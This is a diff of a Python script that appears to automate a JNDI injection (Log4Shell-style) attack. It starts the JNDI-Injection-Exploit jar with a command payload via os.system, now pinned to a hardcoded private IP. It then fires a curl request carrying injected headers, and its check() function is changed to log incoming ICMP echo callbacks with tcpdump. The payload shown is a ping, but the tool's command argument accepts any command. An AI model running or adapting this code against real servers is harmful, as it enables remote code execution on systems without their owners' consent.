@@ -6,6 +6,7 @@ import time
 from requests import get
 from scapy.all import*
 
+
 num = 0
 headers = [
 'ALL',
@@ -94,7 +95,7 @@ def jar():
         num = num + 1
         #debug
         print('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
-        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
+        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+'192.168.52.129'+'" -A '+'192.168.52.129')
     except Exception as err: #서버 구동 실패
         print('[@] LDAP 서버가 구동에 실패하였습니다.\n')
         print(err)
@@ -179,13 +180,9 @@ def main():
         print(attcurl)
         os.system(attcurl)
 
-def check():
-    a = sniff(count=0)
 
-    src = a[ip].src
-    dst = a[ip].dst
-    pro = a[ip].proto
-    print(src, dst, pro)
+def check():
+    os.system('tcpdump -e icmp[icmptype] == 8 > packet.txt')
     
 
 if __name__ == '__main__':
@@ -195,7 +192,3 @@ if __name__ == '__main__':
     t2.daemon=True
     t1.IsBackground=True
     t2.IsBackground=True
-    t1.start()
-    t2.start()
-    main()
-
